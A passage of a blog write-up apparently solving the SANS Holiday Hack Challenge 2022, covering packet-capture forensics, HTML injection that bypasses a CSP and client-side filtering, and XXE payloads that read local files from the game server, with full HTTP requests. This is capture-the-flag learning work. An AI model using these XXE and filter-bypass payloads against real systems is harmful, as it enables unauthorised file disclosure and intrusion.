                        ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓
                          ██▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓██
                              ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
                                ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████
                                    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████
                                    ░░░░░░░░▓▓██████████████████░░░░░░░░

The answer is :code:`oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`.

This gives us our second ring, the Elfen Ring:

.. image:: /images/sans-christmas-challenge-2022/elfen_ring.png
    :alt: The Elfen Ring. It's a simple golden ring, like the one from Lord
        of the Rings, etched with elvish runes.
    :align: center

.. image:: /images/sans-christmas-challenge-2022/rippinproudboot.png
    :alt: Rippin Proudboot, same image as before.
    :align: center

*Rippin Proudboot says*

    How unexpected, you were actually able to help!

    Well, then I must apoligize for my dubious greeting.

    Us Flobbits can't help it sometimes, it's just in our nature.

    Right then, there are other Flobbits that need assistance further into the
    burrows.

    Thank you, and off you go.

Right beside Ripping, we see Grinchum:

.. image:: /images/sans-christmas-challenge-2022/smeagolmad2.png
    :alt: Grinchum is frowning a little bit more.
    :align: center

*Grinchum says*

    😖 *A second Precious is gone! Now we only have three.*

    🤨 **Why are you humanses nagging us? We are busy.** *grinchum..grinchum*

    **You want to know about us? If we tell the naggy human, will it go away?
    Fine...**

    🥺 **The jolly human and the elfses locked up the Preciouses, but I freed
    them all, and together we escaped.**

    **We fled, and we were so alone. We soon forgot the taste of Lembanh, the
    softness of snowflakes falling, even our name.**

    **And we only wanted to eat raw fish: nigiri, maki, or shashimi. But we
    most likes gnawing the whole, living fish, so juicy sweet.**

    **Then we saw the Sporcses, and they wanted my Preciouses all to
    themselves.**

    **And the humanses came, but they just want coinses for their silly hats.**

    **We only meant to protect you, Preciouses, from the naughty Elfses and
    Flobbitses and Sporcses, so we locked you away.**

    😏 **Now leave us alone, naggy human, we must find the two missing
    Preciouses.**

Recover the Web Ring
~~~~~~~~~~~~~~~~~~~~

We go keep going down and chance upon Tangle Coalbox. We learn a little bit
more on the nature of Flobbits and Sporcs:

.. image:: /images/sans-christmas-challenge-2022/tanglecoalbox.png
    :alt: Tangle Coalbox is a blue-skinned elf with a white T-Shirt, bright
        green pants, red- and white-striped socks, bright green pointy elf
        shoes, and an orange-brownish Christmas hat.
    :align: center

*Tangle Coalbox says*

    Hey there, Gumshoe. Tangle Coalbox here again.

    Morcel told you all about the Flobbits, right? Well, be careful ahead.

    Once thought to be the stuff of myths, the Sporcs truly are real, and as
    mean as they are in the stories.

    Once we gained the Flobbits' trust, they taught us all about the Sporcs.
    They, too, were part of the Great Schism.

    They were another people who split off from the colony of Frostians in Oz,
    though, they're more closely related to the trolls.

    The Flobbits, on the other hand, are more like the Munchkins. Like the
    Flobbits, the Sporcs appear when the rings are at risk.

    Digging far down into the ground causes them to emerge, too. Seems we
    created a perfect storm. Whoops!

    They're definitely up to no good, and trying to get the Rings for
    themselves. Tread lightly, friend, and good luck!

Naughty IP
----------

On our way to the Web Ring, we find Alabaster Snowball:

.. image:: /images/sans-christmas-challenge-2022/alabastersnowball.png
    :alt: Alabaster Snowball is an elf with purple skin, a dark green coat with
        white fur, light green pants, black- and white-striped socks, and
        green pointy elf shoes. He has a dark green Christmas hat on his head.
        He's wearing big, roung glasses, and has a white beard.
    :align: center

*Alabaster Snowball says*

    Hey there! I'm Alabaster Snowball

    And I have to say, I'm a bit distressed.

    I was working with the dwarves and their Boria mines, and I found some
    disturbing activity!

    Looking through `these artifacts </docs/sans-christmas-challenge-2022/boriaArtifacts.zip>`__,
    I think something naughty's going on.

    Can you please take a look and answer a few questions for me?

    First, we need to know where the attacker is coming from.

    If you haven't looked at Wireshark's Statistics menu, this might be a good
    time!

Let's take a look at these artifacts:

.. code-block:: console

    $ unzip boriaArtifacts.zip
    Archive:  boriaArtifacts.zip
      inflating: victim.pcap
      inflating: weberror.log

The PCAP file seems the perfect candidate to take a look at the Wireshark's
Statistics menu. Let's open it up and go to :code:`Statistics > IPv4 Statistics
> All Addresses`:

.. image:: /images/sans-christmas-challenge-2022/pcap_statistics.png
    :alt: The Wireshark's Statistics menu. There's a volumetry by IP address.
        The first IP address is 10.12.42.16 with a count of 36874 and a
        presence percentage of 100%. The second IP address is 18.222.86.32 with
        a count of 16603 and a presence percentage of 45,03%.
    :align: center

The first IP address, :code:`10.12.42.16`, is present in 100% of the packets.
This is most likely the IP address of the audited system. Therefore, the most
likely candidate for the attacker's IP address is :code:`18.222.86.32`.

Credential Mining
-----------------

.. image:: /images/sans-christmas-challenge-2022/alabastersnowball.png
    :alt: Alabaster Snowball, same image as before.
    :align: center

*Alabaster Snowball says*

    Aha, you found the naughty actor! Next, please look into the account brute
    force attack.

    You can focus on requests to /login.html~

We must find the first login used in the bruteforce attack. Let's create a
Wireshark filter that will focus on:

1. The attacker's IP address
2. THe HTTP :code:`POST` method
3. The URI :code:`/login.html`

.. code-block:: text

    ip.addr== 18.222.86.32 && http.request.method == "POST" && http.request.uri == "/login.html"

.. image:: /images/sans-christmas-challenge-2022/pcap_bruteforce_attack.png
    :alt: The Wireshark's interface with the result of our filtering. We can
        see that the first login tried by the attacker is alice.
    :align: center

The first login tried by the attacker is :code:`alice`.

404 FTW
-------

.. image:: /images/sans-christmas-challenge-2022/alabastersnowball.png
    :alt: Alabaster Snowball, same image as before.
    :align: center

*Alabaster Snowball says*

    Alice? I totally expected Eve! Well how about forced browsing? What's the
    first URL path they found that way?

    The misses will have HTTP status code 404 and, in this case, the successful
    guesses return 200.

Let's leave the PCAP file for now and take a look at the other artifact, the
web log. We'll :code:`grep` for the attacker's IP address and filter out
responses with an HTTP code :code:`404`:

.. code-block:: console
    :hl_lines: 12

    $ grep 18.222.86.32 weberror.log | grep -v 404 | tail -n 20
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:46:45] "POST /login.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:47:15] "POST /login.html HTTP/1.1" 302 -
    18.222.86.32 - - [05/Oct/2022 16:47:46] "GET /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:47:47] "GET /maintenance.html HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:17] "GET /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:27] "POST /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:32] "POST /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:37] "POST /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:42] "POST /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:47] "POST /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:52] "POST /proc HTTP/1.1" 200 -
    18.222.86.32 - - [05/Oct/2022 16:48:57] "POST /proc HTTP/1.1" 200 -

After the bruteforce attack, we can see that the first URL path found by the
attacker is :code:`/proc`.

IMDS, XXE, and Other Abbreviations
----------------------------------

.. image:: /images/sans-christmas-challenge-2022/alabastersnowball.png
    :alt: Alabaster Snowball, same image as before.
    :align: center

*Alabaster Snowball says*

    Great! Just one more challenge! It looks like they made the server pull
    credentials from IMDS. What URL was forced?

    AWS uses a specific IP address for IMDS lookups. Searching for that in the
    PCAP should get you there quickly.

Alabaster is talking about the `AWS metadata URL <https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html>`__,
which is http://169.254.169.254/latest/meta-data/. Let's filter for HTTP traffic
to IP address :code:`169.254.169.254` in Wireshark, with the following filter:

.. code-block:: text

    ip.addr == 169.254.169.254 && http

.. image:: /images/sans-christmas-challenge-2022/pcap_metadata.png
    :alt: The Wireshark's interface with the result of our filtering. We can
        see that the last request retrieves EC2 credentials.
    :align: center

The last request returns EC2 credentials. The request URL was
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance.

After answering the last question, Alabaster gives us some clues to solve the
puzzle that lies ahead:

.. image:: /images/sans-christmas-challenge-2022/alabastersnowball.png
    :alt: Alabaster Snowball, same image as before.
    :align: center

*Alabaster Snowball says*

    Fantastic! It seems simpler now that I've seen it once. Thanks for showing
    me!

    Hey, so maybe I can help you out a bit with the door to the mines.

    First, it'd be great to bring an Elvish keyboard, but if you can't find
    one, I'm sure other input will do.

    Instead, take a minute to read the HTML/JavaScript source and consider how
    the locks are processed.

    Next, take a look at the Content-Security-Policy header. That drives how
    certain content is handled.

    Lastly, remember that input sanitization might happen on either the client
    or server ends!

Open Boria Mine Door
--------------------

Before we can go on, we must open the door to the Boria Mine. Beside it stands
a Flobbit:

.. image:: /images/sans-christmas-challenge-2022/haltandybuck.png
    :alt: Hal Tandybuck is a Flobbit with light skin. He's wearing a red
        sweater with white loops, black pants and a green cape. He has hairy
        bare feet.
    :align: center

*Hal Tandybuck says*

    Oh hi, I'm Hal Tandybuck. And who might you be?

    I'm hanging out by the door to the mines here because, well, I haven't
    figured out the locks yet.

    It actually reminds me of this locked crate I had three years ago...

    I doubt we'll get much in the way of debug output.

    Think you can help me get through?

Let's take a look at this Boria Mine door:

.. image:: /images/sans-christmas-challenge-2022/boria_mine_instructions.png
    :alt: The Boria Mine instructions, description below.
    :align: center

So there are several cells on the door, and to open a cell, you must connect
the color sensors on each side by entering the correct charaters. It seems that
elvish script works best, but we don't have an elvish keybaord. Let's see our
cells:

.. image:: /images/sans-christmas-challenge-2022/boria_mine_cells.png
    :alt: The Boria Mine cells. There are six of them, connected with various
        color sensors. The first ones are white, then blue, then there are some
        cells with multiple color sensors (white and blue; red and blue; red,
        green, and blue). Sorry, it's a super graphic challenge. You can skip
        ahead.
    :align: center

Alright, I don't know if I solved this challenge in the intended way, but I
found a way that works:

1. The :code:`Content-Security-Policy` of the first cell is pretty permisive.

2. We can use the first cell to generate arbitrary HTML that will be rendered
   as images.

3. One can include images in every cell by submitting an :code:`<img src=x>`
   tag. The catch is that the image must be hosted on the KringleCon domain
   (because of the restrictions in the CSP header). What's more, cells #4 and
   #5 have client-side filtering on the values we send. We can use an
   intercepting proxy, such as Burp, to send any value we want.

So, the idea is to use the first cell to generate arbitrary block of colors
using CSS and the Unicode character `U+2588 <https://www.fileformat.info/info/unicode/char/2588/index.htm>`__.

Here's how I solved each cells:

Cell 1
......  

You can simply submit this HTML code to the first cell:

.. code-block:: html

    <div style="font-size:50px">████████████</div>

Cell 2
......  

You can simply submit this HTML code to the second cell:

.. code-block:: html

    <div style="font-size:300px">████</div>

Cell 3
......  

It gets tricky from here. First, you must generate the wanted image in the
first cell with this HTML code:

.. code-block:: html

    <div style="font-size:100px;color:blue">████████████</div>

This generates the following image:

.. image:: /images/sans-christmas-challenge-2022/24398193ed2bb291da7235b12211d8d3d655f5fc.png
    :alt: A black square with a blue rectangle in the middle.
    :align: center

You can send submit this HTML code to the third cell:

.. code-block:: html

    <img src="/images/24398193ed2bb291da7235b12211d8d3d655f5fc.png"/>


Cell 4
......  

You can submit this HTML code to the fourth cell:

.. code-block:: html

    <div style="font-size:50px">████████████</div> <div style="font-size:250px;color:blue">██████████████████████████████████████</div>

Remember to send the data via an intercepting proxy to bypass the client-side
filtering.

Cell 5
......  

First, you must generate the wanted image in the first cell with this HTML
code:

.. code-block:: html

    <div style="font-size:40px;color:red">████████████████</div>
    <div style="font-size:90px;color:red;margin-top:-20px">█</div>
    <div style="font-size:60px;color:blue;margin-left:10px;margin-top:-10px">█████████</div>
    <div style="font-size:90px;color:blue;margin-left:150px;margin-top:-150px">█</div>

This generates the following image:

.. image:: /images/sans-christmas-challenge-2022/10dc476eb50d6f2661877bf5eeb6726a88c27cc5.png
    :alt: A black square with a red and a blue L-shapes.
    :align: center

You can send submit this HTML code to the fifth cell:

.. code-block:: html

    <img src="/images/10dc476eb50d6f2661877bf5eeb6726a88c27cc5.png"/>

Remember to send the data via an intercepting proxy to bypass the client-side
filtering.

Cell 6
......  

First, you must generate the wanted image in the first cell with this HTML
code:

.. code-block:: html

    <div style="font-size:40px;color:#00ff00">████████████</div>
    <div style="font-size:40px;color:red">████████</div> <div style="font-size:60px;color:red;margin-left:100px;margin-top:-55px">███</div>
    <div style="font-size:60px;color:blue;margin-top:-15px">█████████</div>

This generates the following image:

.. image:: /images/sans-christmas-challenge-2022/7e9a0ae3e494d40d2e4e0343e6dba9222e21afa1.png
    :alt: A black square with a green, a red, and a blue rectangles.
    :align: center

You can send submit this HTML code to the sixth cell:

.. code-block:: html

    <img src="/images/7e9a0ae3e494d40d2e4e0343e6dba9222e21afa1.png"/>

Here's the final result:

.. image:: /images/sans-christmas-challenge-2022/boria_mine_solved.png
    :alt: The Boria Mine cells are all unlocked.
    :align: center

.. image:: /images/sans-christmas-challenge-2022/haltandybuck.png
    :alt: Hal Tandybuck, same image as before.
    :align: center

*Hal Tandybuck says*

    Great! Thanks so much for your help!

    When you get to the fountain inside, there are some things you should
    consider.

    First, it might be helpful to focus on Glamtariel's CAPITALIZED words.

    If you finish those locks, I might just have another hint for you!

    Wha - what?? You opened all the locks?! Well then...

    Did you see the nearby terminal with evidence of an XXE attack?

    Maybe take a close look at that kind of thing.

Glamtariel's Fountain
---------------------

After opening the Boria Mine door, we get to the fountain, but a sporc is there
to meet us.

.. image:: /images/sans-christmas-challenge-2022/akbowl.png
    :alt: Akbowl is a sporc wearing a red toga, black snow shoes with white
        fur, a metal breastplate, and white fur on the shoulders.
    :align: center

*Akbowl says*

    Huh - what? Why do you disturb Akbowl?

    I'm trying to get the ring in here for the Sporc Chief.

    Unlucky for me it's lost in this water basin thing.

    You will *not* get it out before Akbowl!

Let's get the ring before him. To do so, we have to gaze into `Glamtariel's
Galadriel fountain <https://glamtarielsfountain.com/>`__. We must find the
filename of the ring she presents to us.

As usual, there's always one task during the Holiday Hack Challenge that I
spend waaaay too much time on. This year, it's the fountain. Let me explain
how it works:

.. image:: /images/sans-christmas-challenge-2022/fountain_website.png
    :alt: The web interface of Glamtariel's fountain. We see Glamtariel, her
        fountain, and four small images of Santa, a candy cane, an ince cube,
        and an elf. Glamtariel tells us "Welcome to Glamtariel's Fountain! I
        see you have your entrance ticket so we've given you a snack, in case
        you get hungry. I can see there's a lot on your mind. Share these with
        us and enjoy your stay!". The fountain says "I know there is something
        Glamtariel thinks about a lot but never discusses. Perhaps if you share
        things with her, she'd share with the both of us. I may be of some help
        also."
    :align: center

Basically, we drag-and-drop images on Princess Glamtariel or on her fountain,
and they will give us information about them. I will give their answer for each
image:

- Santa:
    - When dropped on Glamtariel:
        - Glamtariel: "I don't know why anyone would ever ask me to **TAMPER**
          with the cookie recipe. I know just how Kringle likes them."
        - The fountain: "Glamtariel likes to keep Kringle happy so that he and
          the elves will visit often."
    - When dropped on the fountain:
        - The fountain: "Kringle really dislikes it if anyone tries to
          **TAMPER** with the cookie recipe Glamtariel uses."
        - Glamtariel: "Kringle really likes the cookies here so I always make
          them the same way."
- The candy cane:
    - When dropped on Glamtariel:
        - Glamtariel: "Mmmmm, I love Kringlish Delight!"
        - The fountain: "I think Glamtariel is thinking of a different story."
    - When dropped on the fountain:
        - The fountain: "Zany Zonka makes the best of these!"
        - Glamtariel: "I think fountain gets confused about things sometimes."
- The ice cube:
    - When dropped on Glamtariel:
        - Glamtariel: "No worries, it doesn't get nearly as cold here as it did
          in Melgarexa. Brrrr, that was one frigid trip."
        - The fountain: "I think it's a perfect temperature here."
    - When dropped on the fountain:
        - The fountain: "Hey, its Chilly Icycube, my old friend! I remember
          when they were but a small drop in the Dimrofel."
        - Glamtariel: "It's always great when old friends visit!"
- The elf:
    - When dropped on Glamtariel:
        - Glamtariel: "I helped the elves to create the **PATH** here to make
          sure that only those invited can find their way here."
        - The fountain: "I wish the elves visited more often."
    - When dropped on the fountain:
        - The fountain: "The elves do a great job making **PATH** s which are easy
          to follow once you see them."
        - Glamtariel: "I don't get away as much as I used to. I think I have
          one last trip in me which I've probably put off for far too long."

When we've asked about every element, the four images change:

.. image:: /images/sans-christmas-challenge-2022/fountain_website_2.png
    :alt: The web interface of Glamtariel's fountain. We see Glamtariel, her
        fountain, and four small images of a ring, an igloo, a sailing ship,
        and a five-pointed star.
    :align: center

Here's what we get when we drop them:

- The ring:
    - When dropped on Glamtariel:
        - Glamtariel: "I do have a small ring collection, including one of
          these."
        - The fountain: "I think Glamtariel likes rings a little more than she
          lets on sometimes."
    - When dropped on the fountain (an evil eye appears, we must click on it to make it go away):
        - The fountain: "Between Glamtariel and Kringle, many who have tried to
          find the **PATH** here uninvited have ended up very dis **APP** ointed.
          Please click away that ominous eye!"
        - Glamtariel: "Careful with the fountain! I know what you were
          wondering about there. It's no cause for concern. The **PATH** here
          is closed!"
- The igloo:
    - When dropped on Glamtariel:
        - Glamtariel: "It's understandable to wonder about home when one is
          adventuring."
        - The fountain: "I think I'd worry too much if I ever left this place."
    - When dropped on the fountain:
        - The fountain: "What's this? Fake tickets to get in here? Snacks that
          don't taste right? How could that be?"
        - Glamtariel: "The fountain shows many things, some more helpful than
          others. It can definitely be a poor guide for decisions sometimes."
- The sailing ship:
    - When dropped on Glamtariel:
        - Glamtariel: "These ice boat things would have been helpful back in
          the day. I still remember when Boregoth stole the Milsarils, very sad
          times."
        - The fountain: "I'm glad I wasn't around for any of the early age
          scuffles. I shudder just thinking about the stories."
    - When dropped on the fountain:
        - The fountain: "I pretty much stick to just one **TYPE** of language,
          it's a lot easier to share things that way."
        - Glamtariel: "Did you know that I speak in many **TYPE** s of
          languages?  For simplicity, I usually only communicate with this one
          though."
- The star:
    - When dropped on Glamtariel or the fountain (same behavior):
        - Glamtariel: "O Frostybreath Kelthonial, shiny stars grace the night
          from heavens on high!"
        - The fountain: "Up and far many look away from glaciers cold, To
          Phenhelos they sing here in Kringle's realm!"

.. image:: /images/sans-christmas-challenge-2022/fountain_website_3.png
    :alt: The web interface of Glamtariel's fountain. We see Glamtariel, her
        fountain, and four small images of a red ring, a silver ring, and two
        blue rings.
    :align: center

Here's what we get when we drop them:

- The blue rings (same behavior for both):
    - When dropped on Glamtariel:
        - Glamtariel: "I love these fancy blue rings! You can see I have two of
          them. Not magical or anything, just really pretty."
        - The fountain: "If asked, Glamtariel definitely tries to insist that
          the blue ones are her favorites. I'm not so sure though."
    - When dropped on the fountain:
        - The fountain: "Glamtariel can be pretty tight lipped about some
          things."
        - Glamtariel: "I like to keep track of all my rings using a **SIMPLE
          FORMAT**, although I usually don't like to discuss such things."
- The silver ring:
    - When dropped on Glamtariel:
        - Glamtariel: "Wow!, what a beautiful silver ring! I don't have one of
          these. I keep a list of all my rings in my **RINGLIST** file. Wait a
          minute! Uh, promise me you won't tell anyone."
        - The fountain: "I never heard Glamtariel mention a **RINGLIST** file
          before. If only there were a way to get a peek at that."
    - When dropped on the fountain:
        - The fountain: "Glamtariel may not have one of these silver rings in
          her collection, but I've overheard her talk about how much she'd like
          one someday."
        - Glamtariel: "You know what one of my favorite songs is? Silver rings,
          silver rings ...."
- The red ring:
    - When dropped on Glamtariel:
        - Glamtariel: "Ah, the fiery red ring! I'm definitely proud to have one
          of them in my collection."
        - The fountain: "I think Glamtariel might like the red ring just as
          much as the blue ones, perhaps even a little more."
    - When dropped on the fountain:
        - The fountain: "You know, I've heard Glamtariel talk in her sleep
          about rings using a different **TYPE** of language. She may be more
          responsive about them if you ask differently."
        - Glamtariel: "Hmmm, you seem awfully interested in these rings. Are
          you looking for something? I know I've heard through the ice cracks
          that Kringle is missing a special one."

And that's it. After that, the messages loop and nothing changes.

Let's recap. You might have noticed that some words are in all caps. If you
remember Hal Tandibuck's clue, these words have some importance. These words
are:

- :code:`TAMPER`: this actually means we should **not** tamper with the cookies
  (I spent several hours trying to but getting nowhere...)
- :code:`PATH`: this probably means that we're going to need to guess the path
  to... something?
- :code:`APP`: this word is used with :code:`PATH`, so maybe :code:`APP` is a
  part of the path we must find?
- :code:`TYPE`: Glamtariel says she understands another type of language, more
  on that later.
- :code:`RINGLIST`: Glamtariel keeps a list of her rings in a file, this must
  be what we must find a path to.
- :code:`SIMPLE FORMAT`: this list of rings is kept in a simple format, most
  likely in a :code:`.txt` file.

We also learn that Glamtariel pretends her favorite rings are the blue ones,
but would very much like to add a silver ring to her collection.

Now, let's take a look under the hood. What "language" are we using to talk to
Glamtariel and her fountain? Here's the request we sent when we dropped the
silver ring on Glamtariel:

.. code-block:: http

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=99e85c94-c24e-4916-8214-996b143317b5.EN8o8Hzkc6bGjlB7yO10QNWkXwg
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/json
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    X-Grinchum: ImI0NWVlYzE1MTMxMGU5MzRmZGI0NDlkNDQxNjQyMzA2ZjkzMTk3NDYi.Y7hu8g.S-ougqTjKWzwSN2US_Z9jmmBca8
    Content-Length: 52
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    {"imgDrop":"img1","who":"princess","reqType":"json"}

.. code-block:: http

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Fri, 06 Jan 2023 19:01:50 GMT
    Content-Type: application/json
    Content-Length: 333
    Set-Cookie: MiniLembanh=99e85c94-c24e-4916-8214-996b143317b5.EN8o8Hzkc6bGjlB7yO10QNWkXwg; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone.^I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that.",
      "droppedOn": "none",
      "visit": "none"
    }

We're using JSON, but apparently Galamtriel supports another type of language.
It would be interesting if it was XML, because we could `exploit an XXE
vulnerability against this JSON endpoint <https://www.netspi.com/blog/technical/web-application-penetration-testing/playing-content-type-xxe-json-endpoints/>`__.
Let's `convert our JSON to XML <https://www.convertjson.com/json-to-xml.htm>`__
and see if it works. We must also make sure to change the :code:`reqType`
parameter from :code:`json` to :code:`xml`, as well as modifying the
:code:`Content-Type` header:

.. code-block:: http
    :hl_lines: 8 22

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=5187b7cc-eaa1-4945-8e16-794290a2dea9.jXW5lp2QZAQt5_9jSvnHEmvi4lI
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/json
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: ImQ3MTM1MWVhNjY2MjgyNzI4YmRjNGJjYWQ5M2MwNmU3MDZhZTJhZmIi.Y7h6Bw.AOMSA0YJKPm1PIU5Tql7hdYfqFk
    Content-Length: 132
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <root>
      <imgDrop>img1</imgDrop>
      <who>princess</who>
      <reqType>xml</reqType>
    </root>

.. code-block:: http

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Fri, 06 Jan 2023 19:45:07 GMT
    Content-Type: application/json
    Content-Length: 193
    Set-Cookie: MiniLembanh=5187b7cc-eaa1-4945-8e16-794290a2dea9.jXW5lp2QZAQt5_9jSvnHEmvi4lI; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
      "droppedOn": "none",
      "visit": "none"
    }

Well, it seems to work, great! Now maybe we can try to exploit an XXE. I first
tried to really exploit the vulnerability to get an error with a verbose
message, or even try a blind XXE (with domain name resolution, or HTTPS
connect back to get a malicious DTD, that sort of thing). But the XXE is
simulated inside the application.

Anyway, we want to leak the ring list file. By taking a look at the requests
made to the website, we see that the different images, including the ones
depicting rings, are stored in :code:`/static/images/`. But we need to find
the web root on the file system. Since we had the clue with the word
:code:`APP`, we can try :code:`/app` as a webroot. Finally, the file name.
Well, it's a ring list stored in a simple format, so let's try
:code:`ringlist.txt`.

Now, we search for a `payload that would allow to read a local file
<https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file>`__:

.. code-block:: http
    :hl_lines: 19 21

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/xml
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: Ijc0MzU2YzI1NTU1NmJhMjQ2Mzc4NjYzMWYwNTg1N2ViNmYyNmFkMWUi.Y7bJLw.CoFMFSmUXQ7Ke7ol0JnKxs88EbE
    Content-Length: 221
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [<!ENTITY example SYSTEM "file:///app/static/images/ringlist.txt"> ]>
    <root>
     <imgDrop>&example;</imgDrop>
      <who>princess</who>
      <reqType>xml</reqType>
    </root>

.. code-block:: http
    :hl_lines: 13

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Thu, 05 Jan 2023 13:00:33 GMT
    Content-Type: application/json
    Content-Length: 350
    Set-Cookie: MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
      "droppedOn": "none",
      "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
    }

We get an image to a secret folder:

.. image:: /images/sans-christmas-challenge-2022/pholder-morethantopsupersecret63842.png
    :alt: A yellow folder, containing two files.
    :align: center

The folder is labeled :code:`x_phial_pholder_2022` and contains two files:
:code:`redring.txt` and :code:`bluering.txt`. Let's take a look at the blue
ring file:

.. code-block:: http
    :hl_lines: 20

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/xml
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: Ijc0MzU2YzI1NTU1NmJhMjQ2Mzc4NjYzMWYwNTg1N2ViNmYyNmFkMWUi.Y7bJLw.CoFMFSmUXQ7Ke7ol0JnKxs88EbE
    Content-Length: 269
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [
    <!ENTITY example SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt">
    ]>
    <root>
